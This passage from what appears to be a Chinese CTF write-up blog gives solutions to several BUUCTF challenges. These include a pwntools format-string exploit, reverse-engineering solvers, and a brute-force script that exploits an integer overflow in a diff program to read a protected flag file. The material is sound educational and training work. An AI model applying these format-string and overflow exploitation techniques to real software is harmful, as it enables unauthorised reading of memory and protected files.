<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/home/kali/Music/libc32/libc-2.23.so&#x27;)</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"><span class="comment"># context.arch=&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p = gdb.debug(&#x27;./pwn-1&#x27;)</span></span><br><span class="line">p = process(<span class="string">&#x27;./pwn-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">addr = <span class="number">0x804c044</span></span><br><span class="line">payload = p32(addr)+<span class="string">r&#x27;%10$s&#x27;</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Hello,&#x27;</span>)</span><br><span class="line">res = p.recv()</span><br><span class="line">rand = u32(res[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line">print(hex(rand))</span><br><span class="line">p.sendline(str(rand))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

### 参考资料

[BUUCTF - [第五空间2019 决赛]PWN5](https://www.jianshu.com/p/0501f4dbaf9e)

## [rev][ACTF新生赛2020]Splendid_MineCraft

自修改代码

1. 第一段flag验证的函数开头有个自修改，直接patch之后更改跳转地址
2. 第二段的比较，当时傻了，每一个byte都可以找任意地址的，然后找到地址的差
3. 第三段直接明文比较

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> v7[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">char</span> v3[<span class="number">6</span>];</span><br><span class="line">    v3[<span class="number">0</span>] = <span class="number">101</span>;</span><br><span class="line">    v3[<span class="number">1</span>] = <span class="number">108</span>;</span><br><span class="line">    v3[<span class="number">2</span>] = <span class="number">99</span>;</span><br><span class="line">    v3[<span class="number">3</span>] = <span class="number">111</span>;</span><br><span class="line">    v3[<span class="number">4</span>] = <span class="number">109</span>;</span><br><span class="line">    v3[<span class="number">5</span>] = <span class="number">101</span>;</span><br><span class="line">    v7[<span class="number">0</span>] = <span class="number">51</span>;</span><br><span class="line">    v7[<span class="number">1</span>] = <span class="number">64</span>;</span><br><span class="line">    v7[<span class="number">2</span>] = <span class="number">49</span>;</span><br><span class="line">    v7[<span class="number">3</span>] = <span class="number">98</span>;</span><br><span class="line">    v7[<span class="number">4</span>] = <span class="number">59</span>;</span><br><span class="line">    v7[<span class="number">5</span>] = <span class="number">98</span>;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">1024</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="built_in">strcpy</span>(flag,<span class="string">&quot;ACTF&#123;&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        flag[i+<span class="number">5</span>]=(v3[i]^v7[i])+<span class="number">35</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%x,0x%x\n&quot;</span>,*(<span class="keyword">int32_t</span>*)(flag+<span class="number">5</span>),*(<span class="keyword">int16_t</span>*)(flag+<span class="number">9</span>));</span><br><span class="line">    <span class="keyword">uint8_t</span> r=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">5</span>;i&lt;<span class="number">11</span>;i++)&#123;</span><br><span class="line">        r^=flag[i];</span><br><span class="line">    &#125;</span><br><span class="line">    flag[<span class="number">11</span>]=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    <span class="comment">// knowo3</span></span><br><span class="line">    <span class="keyword">uint32_t</span> a[] = &#123;<span class="number">0x405100</span><span class="number">-0x405018</span>,<span class="number">0x405102</span><span class="number">-0x405018</span>,<span class="number">0x405102</span><span class="number">-0x405018</span>,<span class="number">0x405109</span><span class="number">-0x405018</span>,<span class="number">0x405100</span><span class="number">-0x405018</span>,<span class="number">0x4051D3</span><span class="number">-0x405018</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">6</span>;i++)&#123;</span><br><span class="line">        flag[<span class="number">12</span>+i]=a[i]^(i+<span class="number">0x83</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// strcpy(&amp;flag[12],&quot;knowo3&quot;);</span></span><br><span class="line">    flag[<span class="number">18</span>]=<span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(&amp;flag[<span class="number">19</span>],<span class="string">&quot;5mcsM&lt;&quot;</span>);</span><br><span class="line">    flag[<span class="number">25</span>]=<span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## 参考资料

[1] [buuoj[ACTF_Junior_2020]Splendid_MineCraft WriteUp](https://www.cnblogs.com/csuchenzc/p/13876127.html)

## [rev][SUCTF2019]hardcpp

1. deflat去混淆
2. 分析函数功能
3. v21=随机值
4. s[0]=&#39;#&#39;
5. s[v19]=enc[v19-1]
6. v21非1即0

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">uint8_t</span> <span class="title">calc</span><span class="params">(<span class="keyword">uint8_t</span> a,<span class="keyword">uint8_t</span> b,<span class="keyword">uint32_t</span> v21)</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> v18 = v21 ^ a;</span><br><span class="line">    <span class="keyword">uint8_t</span> v17 = v18;</span><br><span class="line">    <span class="keyword">uint8_t</span> v16 = b;</span><br><span class="line">    <span class="keyword">uint8_t</span> v3 = v16%<span class="number">7</span>; </span><br><span class="line">    v18 = v17+v3;</span><br><span class="line">    <span class="keyword">uint8_t</span> v15 = v18;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> v14 =b;</span><br><span class="line">    <span class="keyword">uint8_t</span> v4 = v14^<span class="number">18</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> v13 = v4;</span><br><span class="line">    <span class="keyword">uint8_t</span> v5 = v13*<span class="number">3</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> v12 = v5;</span><br><span class="line">    <span class="keyword">uint8_t</span> v6 = v12+<span class="number">2</span>;</span><br><span class="line">    v18 = v15^v6;</span><br><span class="line">    <span class="keyword">return</span> v18;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> a[] = &#123;<span class="number">0xf3</span>, <span class="number">0x2e</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xe1</span>, <span class="number">0x4c</span>, <span class="number">0x22</span>, <span class="number">0xd1</span>, <span class="number">0xf9</span>, <span class="number">0x8c</span>, <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xf4</span>, <span class="number">0xe</span>, <span class="number">0x0</span>, <span class="number">0x5</span>, <span class="number">0xa3</span>, <span class="number">0x90</span>, <span class="number">0xe</span>, <span class="number">0xa5</span>&#125;;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">21</span>]=&#123;<span class="string">&#x27;#&#x27;</span>,<span class="number">0</span>,&#125;;</span><br><span class="line">    <span class="keyword">uint8_t</span> v21=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">size_t</span> i=<span class="number">0</span>;i&lt;<span class="number">20</span>;i++)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">size_t</span> j=<span class="number">0x20</span>;j&lt;<span class="number">0x7f</span>;j++)&#123;</span><br><span class="line">            flag[i+<span class="number">1</span>]=j;</span><br><span class="line">            <span class="keyword">if</span>(calc(flag[i+<span class="number">1</span>],flag[i+v21<span class="number">-1</span>+<span class="number">1</span>],v21)==a[i])&#123;</span><br><span class="line">                flag[i+<span class="number">1</span>]=j;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

## [rev][BJDCTF 2nd]diff2

存在整数溢出

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; buf2[i] + buf1[i] &amp;&amp; i &lt; <span class="number">0x400</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v0 = buf1[i];</span><br><span class="line">    <span class="keyword">if</span> ( v0 != buf2[i] )</span><br><span class="line">      <span class="keyword">return</span> v3 + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v0 == <span class="number">10</span> )</span><br><span class="line">      ++v3;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
这里如果buf[2]+buf[1]溢出为0，则产生误判

另外学习了scp传输文件

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">got=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">43</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0x1</span>,<span class="number">0xff</span>):</span><br><span class="line">        cur=got+chr(j)</span><br><span class="line">        os.system(<span class="string">&quot;echo \&#x27;&quot;</span>+cur+<span class="string">&quot;\&#x27; &gt; /tmp/t&quot;</span>)</span><br><span class="line">        p = os.popen(<span class="string">&quot;/home/ctf/diff /tmp/t /home/ctf/flag&quot;</span>);</span><br><span class="line">        text = p.read()</span><br><span class="line">        <span class="comment"># print(text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> text==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            print(text)</span><br><span class="line">            got+=chr(<span class="number">0x100</span>-j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">print(got)</span><br></pre></td></tr></table></figure>

## [rev]

~~穷举一把梭~~

逆向算法
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> DES,AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="comment"># from math import *</span></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">v6 = <span class="number">11</span></span><br><span class="line">v4=<span class="number">0</span></span><br><span class="line">res = [<span class="number">0xAF</span>,<span class="number">0xAA</span>,<span class="number">0xAD</span>,<span class="number">0xEB</span>,<span class="number">0xAE</span>,<span class="number">0xAA</span>,<span class="number">0xEC</span>,<span class="number">0xA4</span>,<span class="number">0xBA</span>,<span class="number">0xAF</span>,<span class="number">0xAE</span>,<span class="number">0xAA</span>,<span class="number">0x8A</span>,<span class="number">0xC0</span>,<span class="number">0xA7</span>,<span class="number">0xB0</span>,<span class="number">0xBC</span>,<span class="number">0x9A</span>,<span class="number">0xBA</span>,<span class="number">0xA5</span>,<span class="number">0xA5</span>,<span class="number">0xBA</span>,<span class="number">0xAF</span>,<span class="number">0xB8</span>,<span class="number">0x9D</span>,<span class="number">0xB8</span>,<span class="number">0xF9</span>,<span class="number">0xAE</span>,<span class="number">0x9D</span>,<span class="number">0xAB</span>,<span class="number">0xB4</span>,<span class="number">0xBC</span>,<span class="number">0xB6</span>,<span class="number">0xB3</span>,<span class="number">0x90</span>,<span class="number">0x9A</span>,<span class="number">0xA8</span>]</span><br><span class="line">print(len(res))</span><br><span class="line">res = res[::<span class="number">-1</span>]</span><br><span class="line">a = []</span><br><span class="line">cal = <span class="keyword">lambda</span> x: (<span class="number">1</span>&lt;&lt;(v4&amp;<span class="number">3</span>))+<span class="number">1</span>+(x^<span class="number">0x1c7</span>)</span><br><span class="line"><span class="comment"># a.append(res[0]^0xc7)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">37</span>):</span><br><span class="line">    <span class="comment"># for j in range(0x20,0x7f):</span></span><br><span class="line">    <span class="comment">#     v11 = cal(j)</span></span><br><span class="line">    <span class="comment">#     if (v11&amp;0xFF)==res[i]:</span></span><br><span class="line">    <span class="comment">#         v4+=v11</span></span><br><span class="line">    <span class="comment">#         a.append(j)</span></span><br><span class="line">    <span class="comment">#         break</span></span><br><span class="line">    f = res[i]-(<span class="number">1</span>&lt;&lt;(v4&amp;<span class="number">3</span>))</span><br><span class="line">    f = f<span class="number">-1</span></span><br><span class="line">    f^=<span class="number">0xc7</span></span><br><span class="line">    a.append(f)</span><br><span class="line">    v4+=cal(f)</span><br><span class="line"></span><br><span class="line">print(a)</span><br><span class="line">print(str(bytes(a),encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br></pre></td></tr></table></figure>
## [rev][GWCTF 2019]babyvm
1. 虚拟机
2. 操作码
    <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf5, 0xf1, 0xe1, 0x0, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x20, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x1, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x21, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x2, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x22, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x3, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x23, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x4, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x24, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x5, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x25, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x6, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x26, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x7, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x27, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x8, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x28, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x9, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x29, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xa, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2a, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xb, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2b, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xc, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2c, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xd, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2d, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xe, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2e, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xf, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2f, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x10, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x30, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x11, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x31, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x12, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x32, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x13, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x33, 0x0, 0x0, 0x0, 0xf4, 0x0, 0x0, 0x0,</span><br></pre></td></tr></table></figure>
  然而解出来不对，真正的操作码在这里
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xf5, 0xf1, 0xe1, 0x0, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x1, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x0, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x1, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x2, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x1, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x2, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x3, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x2, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x3, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x4, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x3, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x4, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x5, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x4, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x5, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x6, 0x0, 0x0, 0x0, 0xf2, 0xf1, 0xe4, 0x5, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x6, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x7, 0x0, 0x0, 0x0, 0xf1, 0xe3, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe5, 0xc, 0x0, 0x0, 0x0, 0xf6, 0xf7, 0xf1, 0xe4, 0x6, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x7, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe3, 0x9, 0x0, 0x0, 0x0, 0xf1, 0xe5, 0xc, 0x0, 0x0, 0x0, 0xf6, 0xf7, 0xf1, 0xe4, 0x7, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x9, 0x0, 0x0, 0x0, 0xf1, 0xe3, 0xa, 0x0, 0x0, 0x0, 0xf1, 0xe5, 0xc, 0x0, 0x0, 0x0, 0xf6, 0xf7, 0xf1, 0xe4, 0x8, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xd, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x13, 0x0, 0x0, 0x0, 0xf8, 0xf1, 0xe4, 0xd, 0x0, 0x0, 0x0, 0xf1, 0xe7, 0x13, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xe, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x12, 0x0, 0x0, 0x0, 0xf8, 0xf1, 0xe4, 0xe, 0x0, 0x0, 0x0, 0xf1, 0xe7, 0x12, 0x0, 0x0, 0x0, 0xf1, 0xe1, 0xf, 0x0, 0x0, 0x0, 0xf1, 0xe2, 0x11, 0x0, 0x0, 0x0, 0xf8, 0xf1, 0xe4, 0xf, 0x0, 0x0, 0x0, 0xf1, 0xe7, 0x11, 0x0, 0x0, 0x0, 0xf4</span><br></pre></td></tr></table></figure>
3. 长度为21 
4. 开始python脚本
5. sub_b5f为关键函数，控制哪几个数据进寄存器

解题脚本
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">opc = [<span class="number">0xf5</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x20</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x1</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x21</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x2</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x22</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x3</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf2</span>, <span class="number">0xf1</span>, <span class="number">0xe4</span>, <span class="number">0x23</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0xf1</span>, <span class="number">0xe1</span>, <span class="number">0x4</span>, <span 